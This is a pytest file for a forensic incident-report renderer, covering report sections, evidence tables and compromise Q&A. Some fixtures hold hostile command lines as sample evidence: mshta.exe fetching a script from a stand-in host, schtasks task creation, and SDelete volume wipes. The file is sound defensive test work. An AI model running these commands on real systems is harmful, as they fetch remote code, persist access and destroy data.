"""DFIR Report-style narrative renderer."""

from datetime import UTC, datetime

from nexus.ingest.schemas import Artifact, ArtifactSource, ArtifactType, Severity
from nexus.integration.dfir_report import build_dfir_markdown, write_findings_preview
from nexus.langgraph.agents.evidence import cite_block, finding


def _art(**kw):
    defaults = dict(
        id=Artifact.new_id(),
        source=ArtifactSource.ZEEK,
        artifact_type=ArtifactType.NETWORK,
        severity=Severity.HIGH,
        timestamp=datetime.now(UTC),
        host="WS01",
        source_ip="192.168.77.62",
        dest_ip="192.168.77.10",
        dest_port=445,
        description="SMB conn",
        technique_ids=["T1021.002"],
    )
    defaults.update(kw)
    return Artifact(**defaults)


def test_cite_block_includes_ips():
    text = cite_block([_art()])
    assert "192.168.77.10" in text
    assert "WS01" in text


def test_finding_helper_has_description_body():
    f = finding("SMB lateral", [_art()], severity="high", lead="Lateral SMB observed.")
    assert "Lateral SMB" in f["description"]
    assert "192.168.77.10" in f["description"]
    assert "T1021.002" in f["technique_ids"]


def test_dfir_markdown_sections():
    md = build_dfir_markdown(
        case_id="CASE-TEST",
        case_name="Test Case",
        findings=[{
            "id": "F1",
            "title": "Network activity to 192.168.77.10",
            "status": "APPROVED",
            "severity": "high",
            "observation": "SMB traffic cited",
            "mitre_ids": ["T1021.002"],
            "approved_by": "e2e_host",
        }],
        evidence=[{
            "name": "conn.log",
            "path": "/tmp/conn.log",
            "host": "WS01",
            "dest_ip": "192.168.77.10",
            "source_ip": "192.168.77.62",
        }],
        timeline=[{"timestamp": "2026-08-12T00:00:00Z", "host": "WS01", "description": "SMB", "source": "zeek"}],
        sift_notes=["tshark -r conn.pcap -q -z io,phs → OK"],
        rag_notes=["RAG grounded: 4/4 queries"],
        examiner="e2e_host",
    )
    for section in (
        "## Key Takeaways",
        "## Case Summary",
        "## Findings (Evidence-Backed)",
        "## Network",
        "## SIFT Linux Tooling",
        "## Timeline",
        "## Indicators",
        "## Detections",
        "## MITRE ATT&CK",
        "## Evidence Registry",
    ):
        assert section in md
    assert "192.168.77.10" in md
    assert "tshark" in md
    assert "`T1021.002`" in md
    assert "RAG grounded" in md


def test_rag_notes_are_human_readable():
    md = build_dfir_markdown(
        case_id="CASE-RAG",
        case_name="RAG",
        findings=[],
        evidence=[],
        rag_notes=[
            "RAG ready model=BAAI/bge-base-en-v1.5 records=22268",
            "[{'rank': 1, 'score': 0.73, 'source': 'SANS_FOR508', 'title': 'Prefetch PECmd'}]",
        ],
    )
    assert "RAG ready model=BAAI/bge-base-en-v1.5 records=22268" in md
    assert "Prefetch PECmd" in md
    assert "[{'rank'" not in md


def test_dfir_markdown_filters_to_this_run_finding_ids():
    md = build_dfir_markdown(
        case_id="CASE-FILTER",
        case_name="Filter",
        findings=[
            {
                "id": "F-old",
                "title": "Routine Acrobat from CSV heads",
                "status": "APPROVED",
                "severity": "high",
                "observation": "AcroRd32.exe",
            },
            {
                "id": "F-new",
                "title": "Recycle Bin contains deleted PST and SDelete",
                "status": "APPROVED",
                "severity": "high",
                "observation": "sdelete.exe and backup.pst",
            },
        ],
        evidence=[],
        finding_ids=["F-new"],
    )
    assert "SDelete" in md
    assert "Acrobat" not in md


def test_split_questions_strips_trailing_comma():
    from nexus.integration.dfir_report import _split_questions

    qs = _split_questions("What supports insider staging, data staging,? and what supports external compromise?")
    assert qs
    assert not any(",?" in q or q.endswith(",?") for q in qs)
    assert all(q.endswith("?") for q in qs)
    assert any("staging" in q.lower() for q in qs)
    assert any(q.lower().startswith("what ") for q in qs)


def test_timeline_keeps_i1_when_n4_is_truncated():
    n4 = [
        {"timestamp": f"2020-11-14T13:{i:02d}:00Z", "host": "WS01",
         "description": f"n4 hit {i}", "source": "n4"}
        for i in range(90)
    ]
    n4.append({
        "timestamp": "2020-11-14T13:42:00Z",
        "host": "linux01",
        "description": "conn 192.168.77.62 -> 192.168.77.10:445",
        "source": "i1:zeek",
    })
    md = build_dfir_markdown(
        case_id="CASE-I1",
        case_name="I1",
        findings=[],
        evidence=[],
        timeline=n4,
    )
    assert "### Import/ingest (I1)" in md
    assert "i1:zeek" in md
    assert "192.168.77.10" in md


def test_qa_spine_answers_or_insufficient():
    from nexus.integration.dfir_report import build_qa_spine

    rows = build_qa_spine(
        ["What supports insider staging?", "What supports external compromise?"],
        [{
            "id": "F-1",
            "title": "Recycle Bin contains deleted PST and SDelete",
            "observation": "sdelete.exe and backup.pst",
            "status": "APPROVED",
        }, {
            "id": "F-014",
            "title": "No host artifacts in the query pack support external compromise",
            "observation": "Query pack does not support C2 or malware on this host",
            "status": "APPROVED",
        }],
    )
    assert "sdelete" in rows[0]["answer"].lower() or "pst" in rows[0]["answer"].lower()
    assert "INSUFFICIENT" in rows[1]["answer"]
    assert "F-014" in rows[1]["cite"]


def test_qa_spine_ignores_dual_lens_c2_prose():
    from nexus.integration.dfir_report import build_qa_spine

    rows = build_qa_spine(
        ["What supports external compromise?"],
        [{
            "id": "F-009",
            "title": "fredr accessed PST stores",
            "observation": "backup.pst opened",
            "interpretation": "Under the external-compromise lens, no malicious process or C2 is associated.",
            "status": "APPROVED",
        }],
    )
    assert "INSUFFICIENT" in rows[0]["answer"]


def test_qa_spine_refute_beaconing_is_not_external_support():
    from nexus.integration.dfir_report import build_qa_spine

    rows = build_qa_spine(
        ["What supports or refutes external compromise?"],
        [{
            "id": "F-016",
            "title": "PowerShell history records direct SDelete volume wipes",
            "observation": "sdelete64.exe -nobanner -z -c D:",
            "interpretation": (
                "It strengthens the insider-misuse lens; externally it could "
                "reflect cleanup by an operator, but no malware or C2 beaconing "
                "is present in the provided hits."
            ),
        }],
    )
    assert "INSUFFICIENT" in rows[0]["answer"]
    assert "Supported" not in rows[0]["answer"]
    assert "beacon" not in rows[0]["answer"].lower()


def test_qa_spine_sdelete_row_still_supports_insider():
    from nexus.integration.dfir_report import build_qa_spine

    findings = [{
        "id": "F-016",
        "title": "PowerShell history records direct SDelete volume wipes",
        "observation": "sdelete64.exe -nobanner -z -c D:",
        "interpretation": (
            "It strengthens the insider-misuse lens, but no malware or C2 "
            "beaconing is present in the provided hits."
        ),
    }]
    rows = build_qa_spine(
        [
            "What host activity supports or refutes insider misuse / data staging?",
            "What supports or refutes external compromise?",
        ],
        findings,
    )
    assert "Supported" in rows[0]["answer"] and "sdelete" in rows[0]["answer"]
    assert "INSUFFICIENT" in rows[1]["answer"]


def test_qa_spine_host_wipe_supports_attacker_activity():
    from nexus.integration.dfir_report import build_qa_spine

    rows = build_qa_spine(
        ["What attacker activity is evidenced on this host?"],
        [{
            "id": "F-005",
            "title": "USN overwrite of SECURITY and firewall logs",
            "observation": "USN DataOverwrite Close on SECURITY.evtx 2023-01-23",
            "interpretation": "Anti-forensic log wipe on the host.",
            "status": "DRAFT",
        }],
    )
    assert "Supported" in rows[0]["answer"]
    assert "INSUFFICIENT" not in rows[0]["answer"]
    assert "F-005" in rows[0]["cite"]


def test_finding_evidence_renders_as_table_not_prose_wall():
    wall = (
        "Host artifacts show repeated Google Drive File Stream and OneDrive "
        "activity on 2020-11-14: amcache records googledrivefs3229.sys first "
        "seen 2020-08-17 and drive binaries entry 2020-11-15 09:05:16; "
        "appcompat shows GoogleDriveFSSetup.exe on 2020-11-08 and "
        "googledrivesync.exe on 2020-11-03 and 2020-10-15; pecmd shows 8 "
        "GOOGLEDRIVEFS.EXE prefetch runs on 2020-11-14 between 03:56:46 and "
        "14:10:59; jlecmd/lecmd show numerous Quick Access and recent LNK "
        "targets under G:\\My Drive\\STARK-RESEARCH-LABS FOLDER and "
        "G:\\My Drive\\Key; Outlook backup.pst resides in "
        "C:\\Users\\fredr\\OneDrive\\Documents\\Outlook Files."
    )
    md = build_dfir_markdown(
        case_id="CASE-TABLE",
        case_name="Table",
        findings=[{
            "id": "F-022",
            "title": "Google Drive File Stream staging",
            "status": "APPROVED",
            "severity": "high",
            "observation": wall,
            "interpretation": "Authorized cloud sync used for staging.",
        }],
        evidence=[],
    )
    assert "**Evidence**" in md
    assert "| Time (UTC) | Source | Artifact / path | What it shows |" in md
    assert "pecmd" in md
    assert "2020-11-15 09:05:16" in md
    assert r"G:\My Drive" in md
    assert "GOOGLEDRIVEFS.EXE" in md
    assert "Authorized cloud sync used for staging." in md
    assert wall not in md


def test_n4_usb_dump_becomes_table_and_drops_garbage():
    obs = (
        "N4 query-pack hits (113 rows, families: amcache, pecmd, recmd):\n"
        "amcache\\amcache_DevicePnps.csv:194 terms=usbstor: "
        "usbstor/disk&ven_toshiba&prod_external_usb_3.0&rev_0/20130904004110f&0,"
        "2020-11-16 02:29:46,TOSHIBA External USB 3.0 USB Device,diskdrive\n"
        "amcache\\amcache_DevicePnps.csv:207 terms=usbstor: "
        "swd/wpdbusenum/_??_usbstor#disk,2020-11-06 09:37:28,,\ufffd,{eec5ad98}\n"
    )
    md = build_dfir_markdown(
        case_id="CASE-USB",
        case_name="USB",
        findings=[{
            "id": "F-028",
            "title": "USB / USBSTOR activity",
            "status": "APPROVED",
            "severity": "high",
            "observation": obs,
            "interpretation": "Removable media was attached.",
        }],
        evidence=[],
    )
    assert "TOSHIBA External USB 3.0" in md
    assert "2020-11-16 02:29:46" in md
    assert "\ufffd" not in md
    assert "amcache\\amcache_DevicePnps.csv:194 terms=usbstor:" not in md


def test_structured_evidence_wins_over_observation():
    md = build_dfir_markdown(
        case_id="CASE-EV",
        case_name="EV",
        findings=[{
            "id": "F-1",
            "title": "SDelete",
            "status": "APPROVED",
            "severity": "high",
            "observation": "ignore this wall",
            "evidence": [{
                "time": "2020-11-14 13:42:33",
                "source": "amcache",
                "artifact": r"C:\Users\fredr\Downloads\SDelete\sdelete.exe",
                "detail": "first executed",
            }],
            "interpretation": "Anti-forensics.",
        }],
        evidence=[],
    )
    assert "2020-11-14 13:42:33" in md
    assert "amcache" in md
    assert "sdelete.exe" in md
    assert "ignore this wall" not in md


def test_dfir_markdown_include_draft_watermark():
    md = build_dfir_markdown(
        case_id="CASE-DRAFT",
        case_name="Draft preview",
        findings=[{
            "id": "F-001",
            "title": "wacsvc accessed SRL-Eyes-Only",
            "status": "DRAFT",
            "severity": "high",
            "observation": "jlecmd hit on SRL-Eyes-Only",
            "interpretation": "Needs examiner review.",
        }],
        evidence=[],
        include_draft=True,
    )
    assert "PREVIEW" in md
    assert "Not HMAC-approved" in md
    assert "wacsvc accessed SRL-Eyes-Only" in md
    assert "**Status:** DRAFT" in md
    assert "not HMAC-approved" in md
    official = build_dfir_markdown(
        case_id="CASE-DRAFT",
        case_name="Draft preview",
        findings=[{
            "id": "F-001",
            "title": "wacsvc accessed SRL-Eyes-Only",
            "status": "DRAFT",
            "severity": "high",
            "observation": "jlecmd hit on SRL-Eyes-Only",
        }],
        evidence=[],
        include_draft=False,
    )
    assert "wacsvc accessed SRL-Eyes-Only" not in official
    assert "No APPROVED findings yet" in official


def test_write_findings_preview(tmp_path):
    case = tmp_path / "INC-PREVIEW"
    (case / "reports").mkdir(parents=True)
    (case / "CASE.yaml").write_text(
        "case_id: INC-PREVIEW\nname: Preview\nexaminer: e2e_host\n",
        encoding="utf-8",
    )
    (case / "findings.json").write_text(
        '[{"id":"F-003","title":"USN overwrite of SECURITY","status":"DRAFT",'
        '"severity":"high","observation":"USN close+overwrite"}]',
        encoding="utf-8",
    )
    out = write_findings_preview(case)
    assert out.name == "REPORT-DRAFT.md"
    text = out.read_text(encoding="utf-8")
    assert "PREVIEW" in text
    assert "USN overwrite of SECURITY" in text
    assert "**Status:** DRAFT" in text


def test_dated_timeline_drops_generic_jsonl():
    from nexus.integration.dfir_report import dated_timeline

    dated, untimed = dated_timeline(
        [
            {
                "timestamp": "2023-01-23",
                "description": "Generic JSONL record",
                "source": "i1:generic_jsonl",
            },
            {
                "timestamp": "2023-01-23T06:52:00Z",
                "description": "USN DataOverwrite SECURITY",
                "source": "n4",
            },
            {
                "timestamp": "",
                "description": "wevtutil keyword",
                "source": "n4",
            },
        ]
    )
    assert len(dated) == 1
    assert "DataOverwrite" in dated[0]["description"]
    assert len(untimed) == 1
    assert "wevtutil" in untimed[0]["description"]



def _legacy_hit_finding(fid: str, needle: str, rows: list[dict]) -> dict:
    """Findings staged before parsed-evidence rows: raw CSV text as detail."""
    return {
        "id": fid,
        "status": "APPROVED",
        "title": f"Signal: {needle} — {len(rows)} hit(s) across hayabusa",
        "severity": "",
        "observation": f"{len(rows)} hit(s) across hayabusa matching examiner-selected needles.",
        "interpretation": (
            f"Needle '{needle}' (sigma) matched {len(rows)} row(s) — "
            "candidate signal pending examiner review."
        ),
        "approved_by": "e2e",
        "evidence": [
            {
                "time": r.get("time", ""),
                "source": f"hayabusa/{r['artifact']}",
                "artifact": r["artifact"],
                "detail": r["detail"],
            }
            for r in rows
        ],
    }


_HAY_HEADER = (
    "Timestamp,RuleTitle,Level,Computer,Channel,EventID,RecordID,Details,"
    "ExtraFieldInfo,RuleID"
)
_HAY_ROW_A = (
    '"2019-05-21 21:02:57.867 +05:30","Proc Exec","high","IEWIN7","Sysmon",'
    '1,4127,"Cmdline: ""C:\Windows\System32\mshta.exe"" '
    'https://x.tld/a.txt",,r1'
)
_HAY_ROW_B = (
    '"2019-05-21 21:02:59.769 +05:30","Scheduled Task Creation Via '
    'Schtasks.EXE","med","IEWIN7","Sysmon",1,4129,"Cmdline: schtasks.exe '
    '/Create /TN MSOFFICE_",,r2'
)


def _case_with_csv(tmp_path):
    case = tmp_path / "CASE-LEGACY"
    ext = case / "extractions" / "hayabusa"
    ext.mkdir(parents=True)
    (ext / "evtx-timeline.csv").write_text(
        _HAY_HEADER + "\n" + _HAY_ROW_A + "\n" + _HAY_ROW_B + "\n",
        encoding="utf-8",
    )
    return case


def test_report_rehydrates_legacy_raw_csv_rows(tmp_path):
    """Pre-parse findings: raw CSV detail -> parsed fields + recovered loc."""
    case = _case_with_csv(tmp_path)
    f = _legacy_hit_finding("F-1", "mshta", [
        {"artifact": "hayabusa/evtx-timeline.csv", "detail": _HAY_ROW_A,
         "time": "2019-05-21T21:02:57"},
    ])
    md = build_dfir_markdown(
        case_id="CASE-LEGACY", case_name="t", findings=[f], evidence=[],
        case_dir=case,
    )
    assert "RuleTitle: Proc Exec" in md
    assert "pending examiner review" not in md
    assert "evtx-timeline.csv:2" in md  # true file:line recovered
    assert "[high]" in md  # severity backfilled from Level=high


def test_report_fuses_findings_sharing_evidence_rows(tmp_path):
    """Needles on the same rows collapse into one correlated section."""
    case = _case_with_csv(tmp_path)
    rows = [
        {"artifact": "hayabusa/evtx-timeline.csv", "detail": _HAY_ROW_A,
         "time": "2019-05-21T21:02:57"},
        {"artifact": "hayabusa/evtx-timeline.csv", "detail": _HAY_ROW_B,
         "time": "2019-05-21T21:02:59"},
    ]
    fa = _legacy_hit_finding("F-A", "mshta", rows)
    fb = _legacy_hit_finding("F-B", "mshta.exe", rows)
    md = build_dfir_markdown(
        case_id="CASE-LEGACY", case_name="t", findings=[fa, fb], evidence=[],
        case_dir=case,
    )
    assert "Correlated signal" in md
    assert "one attack chain" in md
    assert md.count("### Signal:") == 0  # no standalone sections


def test_report_keeps_distinct_findings_separate(tmp_path):
    """Below-overlap findings must not fuse — each stays its own section."""
    case = _case_with_csv(tmp_path)
    fa = _legacy_hit_finding("F-A", "mshta", [
        {"artifact": "hayabusa/evtx-timeline.csv", "detail": _HAY_ROW_A,
         "time": "2019-05-21T21:02:57"},
    ])
    fb = _legacy_hit_finding("F-B", "schtasks", [
        {"artifact": "hayabusa/evtx-timeline.csv", "detail": _HAY_ROW_B,
         "time": "2019-05-21T21:02:59"},
    ])
    md = build_dfir_markdown(
        case_id="CASE-LEGACY", case_name="t", findings=[fa, fb], evidence=[],
        case_dir=case,
    )
    assert "Correlated signal" not in md
    assert md.count("### Signal:") == 2


def test_report_without_case_dir_keeps_working(tmp_path):
    """case_dir=None callers keep old rendering — no crash, no rehydrate."""
    f = _legacy_hit_finding("F-1", "mshta", [
        {"artifact": "hayabusa/evtx-timeline.csv", "detail": _HAY_ROW_A},
    ])
    md = build_dfir_markdown(
        case_id="CASE-LEGACY", case_name="t", findings=[f], evidence=[],
    )
    assert "### Signal: mshta" in md


def test_severity_from_hit_levels():
    from nexus.langgraph.mode1 import _severity_from_hits

    assert _severity_from_hits([
        {"family": "hayabusa", "fields": {"Level": "high"}},
        {"family": "evtxecmd", "fields": {"Level": "Info"}},
    ]) == "high"
    assert _severity_from_hits([
        {"family": "chainsaw", "fields": {"detections": "Rule X"}},
    ]) == "medium"
    # evtxecmd Level is the Windows event level, not detection severity
    assert _severity_from_hits([
        {"family": "evtxecmd", "fields": {"Level": "Info"}},
    ]) == "low"
    assert _severity_from_hits([]) == "low"


def test_report_sorts_key_takeaways_by_severity():
    md = build_dfir_markdown(
        case_id="CASE-SEV", case_name="t",
        findings=[
            {"id": "F-low", "title": "aaa low", "status": "APPROVED",
             "severity": "low", "observation": "x"},
            {"id": "F-crit", "title": "zzz critical", "status": "APPROVED",
             "severity": "critical", "observation": "x"},
        ],
        evidence=[],
    )
    kt = md.split("## Key Takeaways")[1].split("##")[0]
    assert kt.index("[critical]") < kt.index("[low]")
